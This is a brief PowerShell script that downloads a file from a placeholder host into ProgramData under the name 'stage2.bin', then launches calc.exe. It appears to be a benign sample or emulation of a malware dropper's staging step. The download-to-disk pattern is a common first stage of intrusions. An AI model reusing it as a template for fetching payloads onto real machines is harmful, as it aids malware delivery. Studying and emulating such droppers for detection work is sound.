
[CmdletBinding()]
param(
    [string]$TransferUrl = "https://example.com:8443/update.dat",
    [string]$OutputPath = 'C:\ProgramData\stage2.bin'
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $OutputPath)
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
